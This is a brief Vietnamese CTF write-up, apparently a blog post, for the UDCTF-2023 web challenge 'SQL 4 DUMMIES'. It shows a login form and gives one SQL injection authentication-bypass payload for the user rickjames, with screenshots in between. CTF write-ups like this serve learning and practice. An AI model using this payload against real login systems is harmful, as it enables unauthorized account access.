---
title: Write-Up SQL 4 DUMMIES
date: 2023-10-4 7:55:00 +0700
categories: [CTF, UDCTF-2023, Write-Up]
tags: [web, write-up, ctf]     # TAG names should always be lowercase
---
# SQL 4 DUMMIES

- Truy cập vào trang web thì ta thấy 1 form login, và ta biết được tài khoản là rickjames

<img src="/assets/writeup/cookie/SQL 4 DUMMIES 6a94d5d7b64b4eb79db0b1facd8a1686/Untitled.png">

- Bài này khá đơn giản nên mình sẽ viết ngắn gọn

<img src="/assets/writeup/cookie/SQL 4 DUMMIES 6a94d5d7b64b4eb79db0b1facd8a1686/Untitled 1.png">

payload: `rickjames’ or 1=’1 --`

<img src="/assets/writeup/cookie/SQL 4 DUMMIES 6a94d5d7b64b4eb79db0b1facd8a1686/Untitled 2.png">
